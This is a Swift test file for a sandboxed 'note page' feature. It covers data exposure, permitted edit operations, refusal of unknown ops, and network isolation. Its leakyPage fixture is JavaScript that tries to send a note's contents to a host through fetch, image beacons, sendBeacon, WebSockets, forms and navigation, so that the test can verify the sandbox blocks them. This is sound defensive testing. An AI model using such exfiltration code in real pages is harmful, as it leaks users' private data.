import Foundation
import Network
import Testing
import WebKit
@testable import Pane

/// Note pages (prototype): what a page is given, the edits it can ask for, and the sandbox it runs in.
@MainActor @Suite struct NotePageTests {
    static let habits = """
    Habits

    <!-- pane-table: Date=date; Walk=choice ✓; Read=text -->
    | Date | Walk | Read |
    | --- | --- | --- |
    | 2026-10-03 | ✓ | |
    | 2026-10-04 |  | ✓ |

    - [x] Buy shoes
    - [ ] Pick a book
    After
    """

    // MARK: What the page sees

    @Test func dataHoldsTablesWithTypesAndChecklistsWithLines() throws {
        let d = NotePage.data(of: Self.habits, today: TypedTable.date(from: "2026-10-04")!)
        #expect(d["title"] as? String == "Habits")
        #expect(d["today"] as? String == "2026-10-04")
        let tables = try #require(d["tables"] as? [[String: Any]])
        #expect(tables.count == 1)
        let columns = try #require(tables[0]["columns"] as? [[String: String]])
        #expect(columns == [["name": "Date", "type": "date"], ["name": "Walk", "type": "choice ✓"], ["name": "Read", "type": "text"]])
        #expect(tables[0]["rows"] as? [[String]] == [["2026-10-03", "✓", ""], ["2026-10-04", "", "✓"]])
        let lists = try #require(d["checklists"] as? [[String: Any]])
        #expect(lists.map { $0["line"] as? Int } == [9, 10])
        #expect(lists.map { $0["text"] as? String } == ["Buy shoes", "Pick a book"])
        #expect(lists.map { $0["checked"] as? Bool } == [true, false])
    }

    @Test func untypedAndSeveralTablesAreFound() {
        let body = "T\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\ntext\n\n| X |\n| :-: |\n"
        let t = NotePage.tables(in: body.components(separatedBy: "\n"))
        #expect(t.map(\.rows) == [[["1", "2"]], []])
        #expect(t.map { $0.columns.map(\.name) } == [["A", "B"], ["X"]])
        #expect(t[1].end == 10)
    }

    // MARK: Edits

    func apply(_ message: [String: Any], to body: String = habits) throws -> String {
        try NotePage.apply(try NotePage.Op(message), to: body)
    }

    @Test func setCellChangesOneRowByColumnNameOrIndex() throws {
        let out = try apply(["op": "set_cell", "table": 0, "row": 1, "col": "walk", "value": "✓"])
        #expect(out == Self.habits.replacingOccurrences(of: "| 2026-10-04 |  | ✓ |", with: "| 2026-10-04 | ✓ | ✓ |"))
        let cleared = try apply(["op": "set_cell", "table": 0, "row": 0, "col": 1, "value": ""])
        #expect(cleared.contains("| 2026-10-03 |  |  |"))
        // Everything else is left exactly as written.
        #expect(cleared.components(separatedBy: "\n").filter { !$0.contains("2026-10-03") } == Self.habits.components(separatedBy: "\n").filter { !$0.contains("2026-10-03") })
    }

    @Test func appendRowGoesRightAfterTheLastRow() throws {
        let out = try apply(["op": "append_row", "table": 0, "values": ["Date": "2026-10-05", "Read": "✓"]])
        #expect(out.contains("| 2026-10-04 |  | ✓ |\n| 2026-10-05 |  | ✓ |\n\n- [x] Buy shoes"))
        let inOrder = try apply(["op": "append_row", "table": 0, "values": ["2026-10-06", "✓"]])
        #expect(inOrder.contains("| 2026-10-06 | ✓ |  |\n\n"))
    }

    @Test func toggleChecklistFlipsAndSortsLikeTheEditor() throws {
        // Ticking "Pick a book" sinks it below… nothing open is left, so both stay ticked in order.
        let out = try apply(["op": "toggle_checklist", "line": 10])
        #expect(out.contains("- [x] Buy shoes\n- [x] Pick a book\nAfter"))
        // Unticking "Buy shoes" brings it above the ticked ones.
        let back = try apply(["op": "toggle_checklist", "line": 9], to: out)
        #expect(back.contains("- [ ] Buy shoes\n- [x] Pick a book"))
    }

    @Test func valuesAreOneLineAndPlainText() throws {
        let out = try apply(["op": "set_cell", "table": 0, "row": 0, "col": "Read", "value": "a | b\nc"])
        #expect(out.contains("| 2026-10-03 | ✓ | a \\| b c |"))
        #expect(NotePage.tables(in: out.components(separatedBy: "\n"))[0].rows[0][2] == "a | b c")
        #expect(try apply(["op": "set_cell", "table": 0, "row": 0, "col": "Read", "value": 3]).contains("| ✓ | 3 |"))
    }

    @Test func anythingElseIsRefusedWithAReason() {
        func refused(_ m: Any, _ why: String) {
            do {
                _ = try NotePage.apply(try NotePage.Op(m), to: Self.habits)
                Issue.record("accepted \(m)")
            } catch {
                #expect((error as? LocalizedError)?.errorDescription?.contains(why) == true, "\(error)")
            }
        }
        refused(["op": "eval", "js": "x"], "Unknown op")
        refused("set_cell", "Send { op")
        refused(["op": "replace_note", "markdown": "gone"], "Unknown op")
        refused(["op": "toggle_checklist", "line": 1], "isn't a checklist item")
        refused(["op": "toggle_checklist", "line": 99], "isn't a checklist item")
        refused(["op": "set_cell", "table": 1, "row": 0, "col": 0, "value": "x"], "Table 1 doesn't exist")
        refused(["op": "set_cell", "table": 0, "row": 5, "col": 0, "value": "x"], "has 2 rows")
        refused(["op": "set_cell", "table": 0, "row": 0, "col": "Sleep", "value": "x"], "No column Sleep")
        refused(["op": "set_cell", "table": 0, "row": 0, "col": 0, "value": String(repeating: "x", count: 501)], "500 characters")
        refused(["op": "append_row", "table": 0, "values": ["a", "b", "c", "d"]], "3 columns")
        refused(["op": "set_cell", "table": 0, "row": 0.5, "col": 0, "value": "x"], "whole number")
    }

    // MARK: The sandbox

    @Test func theDoctypeGivesWayToThePolicy() {
        let html = NotePageSandbox.sandboxed("\n<!DOCTYPE html><html><head><title>x</title></head><body></body></html>")
        #expect(html.hasPrefix("<!doctype html><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none';"))
        #expect(html.hasSuffix("<html><head><title>x</title></head><body></body></html>"))
        #expect(!html.contains("<!DOCTYPE"))
    }

    /// Counts connections to a port on this Mac.
    final class Listener: @unchecked Sendable {
        let listener: NWListener
        private let lock = NSLock()
        private var count = 0
        var connections: Int { lock.withLock { count } }

        init() throws {
            let params = NWParameters.tcp
            params.requiredLocalEndpoint = .hostPort(host: "127.0.0.1", port: .any)
            listener = try NWListener(using: params)
            listener.newConnectionHandler = { [weak self] c in
                self?.lock.withLock { self?.count += 1 }
                c.start(queue: .global())
                c.send(content: Data("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".utf8), completion: .contentProcessed { _ in c.cancel() })
            }
        }

        func start() async throws -> UInt16 {
            listener.start(queue: .global())
            for _ in 0..<100 {
                if let p = listener.port?.rawValue, p != 0 { return p }
                try await Task.sleep(for: .milliseconds(20))
            }
            throw CancellationError()
        }
    }

    /// A page that tries every way out it can think of, toward `base`.
    static func leakyPage(_ base: String) -> String {
        """
        <!doctype html><html><head><link rel="stylesheet" href="\(base)/css"></head><body>
        <img src="\(base)/img"><iframe src="\(base)/frame"></iframe>
        <form id="f" action="\(base)/form" method="post"><input name="n" value="x"></form>
        <script>
          window.__done = false; window.__results = [];
          const note = encodeURIComponent((window.amber && amber.note.markdown) || "");
          (async () => {
            try { await fetch("\(base)/fetch?n=" + note, { mode: "no-cors" }); __results.push("fetch sent"); } catch (e) { __results.push("fetch blocked"); }
            await new Promise((d) => { const x = new XMLHttpRequest(); x.open("GET", "\(base)/xhr"); x.onload = () => { __results.push("xhr sent"); d(); }; x.onerror = () => { __results.push("xhr blocked"); d(); }; try { x.send(); } catch (e) { __results.push("xhr blocked"); d(); } });
            await new Promise((d) => { const i = new Image(); i.onload = () => { __results.push("image sent"); d(); }; i.onerror = () => { __results.push("image blocked"); d(); }; i.src = "\(base)/beacon?n=" + note; });
            try { new WebSocket("\(base.replacingOccurrences(of: "http", with: "ws"))/ws"); } catch (e) {}
            try { navigator.sendBeacon("\(base)/send", note); } catch (e) {}
            try { window.open("\(base)/open"); } catch (e) {}
            try { document.getElementById("f").submit(); } catch (e) {}
            await new Promise((r) => setTimeout(r, 300));
            try { location.href = "\(base)/nav"; } catch (e) {}
            window.__done = true;
          })();
        </script></body></html>
        """
    }

    func run(_ web: WKWebView, until: String) async throws {
        for _ in 0..<150 {
            if (try? await web.evaluateJavaScript(until)) as? Bool == true { return }
            try await Task.sleep(for: .milliseconds(50))
        }
        Issue.record("timed out waiting for \(until)")
    }

    @Test func aPageCanReachNothingOutside() async throws {
        let server = try Listener()
        let port = try await server.start()
        defer { server.listener.cancel() }
        let base = "http://127.0.0.1:\(port)"

        // Without the sandbox, the same page does reach the server: the listener can tell.
        let open = WKWebView(frame: CGRect(x: 0, y: 0, width: 320, height: 480))
        open.loadHTMLString(Self.leakyPage(base), baseURL: nil)
        for _ in 0..<100 where server.connections == 0 { try await Task.sleep(for: .milliseconds(50)) }
        #expect(server.connections > 0, "the control page should have reached the listener")
        open.stopLoading()
        try await Task.sleep(for: .milliseconds(300))
        let before = server.connections

        let sandbox = NotePageSandbox(rules: try await NotePageSandbox.prepare())
        sandbox.load(html: Self.leakyPage(base), body: "Secret\n\nmy bank PIN")
        try await run(sandbox.webView, until: "window.__done === true")
        try await Task.sleep(for: .seconds(1.5))
        let results = try await sandbox.webView.evaluateJavaScript("window.__results") as? [String]
        #expect(results == ["fetch blocked", "xhr blocked", "image blocked"])
        #expect(server.connections == before, "the sandboxed page reached the network")
        #expect(sandbox.webView.url?.absoluteString == "about:blank")
        #expect(sandbox.blocked.contains { $0.hasPrefix("navigation \(base)") })
    }

    @Test func thePageGetsTheNoteAndChangesItOnlyThroughTheBridge() async throws {
        let sandbox = NotePageSandbox(rules: try await NotePageSandbox.prepare())
        var body = Self.habits
        var asked: [NotePage.Op] = []
        sandbox.onUpdate = { op in
            asked.append(op)
            body = try NotePage.apply(op, to: body)
            sandbox.push(body: body)
        }
        let page = """
        <!doctype html><body><script>
          window.__seen = [];
          amber.onChange((n) => __seen.push(n.tables[0].rows[1][1]));
          window.__go = async () => {
            window.__good = await amber.update({ op: "set_cell", table: 0, row: 1, col: "Walk", value: "✓" });
            window.__bad = await amber.update({ op: "replace_note", markdown: "" });
            window.__done = true;
          };
        </script></body>
        """
        sandbox.load(html: page, body: body)
        try await run(sandbox.webView, until: "typeof window.__go === 'function'")
        _ = try? await sandbox.webView.evaluateJavaScript("window.__go(); 1")
        try await run(sandbox.webView, until: "window.__done === true")
        #expect(asked == [.setCell(table: 0, row: 1, col: .name("Walk"), value: "✓")])
        #expect(body.contains("| 2026-10-04 | ✓ | ✓ |"))
        #expect(try await sandbox.webView.evaluateJavaScript("window.__good.ok") as? Bool == true)
        #expect(try await sandbox.webView.evaluateJavaScript("window.__bad.error") as? String == "Unknown op replace_note.")
        try await run(sandbox.webView, until: "window.__seen.length === 2")
        #expect(try await sandbox.webView.evaluateJavaScript("window.__seen") as? [String] == ["", "✓"])
    }
}
